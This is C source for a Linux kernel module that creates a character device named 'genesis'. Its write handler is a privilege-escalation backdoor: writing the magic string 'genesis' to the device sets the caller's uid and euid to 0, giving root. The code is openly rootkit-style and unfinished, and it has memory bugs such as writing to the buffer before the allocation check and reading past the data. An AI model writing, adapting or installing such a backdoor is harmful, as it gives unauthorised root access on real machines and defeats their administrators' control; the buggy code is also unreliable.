#include <linux/module.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <asm/uaccess.h>

#define FIRST_MINOR  1  // The first minor version
#define DEVICE_COUNT 2  // Amount of devices we want to be able to create

static int __init genesis_init(void);
static void __exit genesis_exit(void);
int genesis_open(struct inode *in, struct file *f);
ssize_t genesis_read(struct file *f, char __user *buf, size_t buf_len, loff_t *offp);
ssize_t genesis_write(struct file *f, const char __user *buf, size_t buf_len, loff_t *offp);

typedef struct _genesis_s {

    dev_t devno;
    struct cdev device;
    
} genesis_t;

genesis_t genesis;

struct file_operations genesis_fops = {
    .owner = THIS_MODULE,
    .open = genesis_open,
    .write = genesis_write,
    .read = genesis_read
};



//int (*open) (struct inode *, struct file *)
int genesis_open(struct inode *in, struct file *f) {
    return 0;
}

//ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
ssize_t genesis_read(struct file *f, char __user *buf, size_t buf_len, loff_t *offp) {
    return buf_len;
}

//ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
ssize_t genesis_write(struct file *f, const char __user *buf, size_t buf_len, loff_t *offp) {
    char *data;
    size_t i;
    char magic[] = "genesis";
    struct cred *cur_cred;
    struct cred *new_cred;

    data = (char *)kmalloc(buf_len+1, GFP_KERNEL);

    for(i = 0; i <= buf_len; i++) {
        data[i] = 0x00;
    }
    
    if(data) {
        copy_from_user(data, buf, buf_len);

        if(memcmp(data, magic, 7) == 0) {

            /**
             * This here causes a warning of us changing a const struct.
             * I need to figure out a way to create a new cred, copy the current
             * process cred to it and then in this new cred change the uid and euid
             * After that I set this new cred to replace the old one
             */
            
            cur_cred = get_current_cred();
            cur_cred->uid = 0;
            cur_cred->euid = 0;
            //memcpy(new_cred, cur_cred)
            //set uid in new cred_
            //cred_override(new_cred)
        }

        for(i = 0; i <= buf_len; i++) {
            printk(KERN_ALERT "data[i] = %02X\n", data[i]);
        }
        
        printk(KERN_ALERT "Wrote %s to the file\n", data);
        kfree(data);
    } else {
        printk(KERN_ALERT "Unable to allocate memory");
    }

    return buf_len;
}

static int __init genesis_init() {

    int err;

    err = alloc_chrdev_region(&genesis.devno, FIRST_MINOR, DEVICE_COUNT, "genesis");

    if(err != 0) {
        printk(KERN_ALERT "Could not allocate a region for the device. Aborting...\n");
        return err;
    }

    cdev_init(&genesis.device, &genesis_fops);

    genesis.device.owner = THIS_MODULE;
    genesis.device.ops = &genesis_fops;

    err = cdev_add(&genesis.device, genesis.devno, DEVICE_COUNT);

    if(err != 0) {
        printk(KERN_ALERT "Could not add device. Aborting...\n");
        return err;
    }

    printk(KERN_ALERT "Device genesis created succesfully!\n");
    return 0;
    
}

static void __exit genesis_exit() {
    cdev_del(&genesis.device);
    unregister_chrdev_region(genesis.devno, DEVICE_COUNT);

    printk(KERN_ALERT "Apocalypse now!\n");
}

module_init(genesis_init);
module_exit(genesis_exit);
